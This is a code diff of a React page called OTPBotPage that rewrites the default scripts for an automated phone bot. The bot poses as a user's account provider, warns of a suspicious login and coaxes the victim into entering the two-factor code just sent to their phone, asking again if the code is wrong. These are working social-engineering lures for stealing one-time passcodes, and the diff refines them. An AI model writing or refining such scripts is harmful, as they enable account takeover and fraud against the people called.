@@ -133,11 +133,11 @@ const OTPBotPage = () => {
         otp_digits: 6,
         language: 'en',
         voice_name: 'Joanna',
-        step1_message: 'Hello {name}, we have detected a login attempt to your {service} account from a new device. If you did not recognize this request, please press 1. If this was you, press 0.',
-        step2_message: 'Alright, we just sent a {digits} digit verification code to your number. Could you please enter it using your dial pad?',
-        step3_message: 'Okay, please wait a moment while we verify the code.',
-        accepted_message: 'Okay! We have declined the sign-in request, and your account is safe. Thank you for your time. Have a nice day!',
-        rejected_message: 'I am sorry, but the code you entered is incorrect. Could you please enter it again? It should be {digits} digits.'
+        step1_message: 'Hello {name}. We have detected a login attempt to your {service} account from a new device or location. If you did not recognize this request, please press 1. If this was you, press 0 to approve.',
+        step2_message: 'To Verification, please enter the {digits} digit security code that was just sent to your registered mobile number.',
+        step3_message: 'Thank you. Please hold for a moment while we verify your code.',
+        accepted_message: 'Thank you for waiting. We will get back to you if we need further information. Thank you for your attention, good bye.',
+        rejected_message: 'Thank you for waiting. The verification code you entered previously is incorrect. Please check your device and enter the correct {digits} digit code.'
     });
 
     const [activeStep, setActiveStep] = useState('step1');
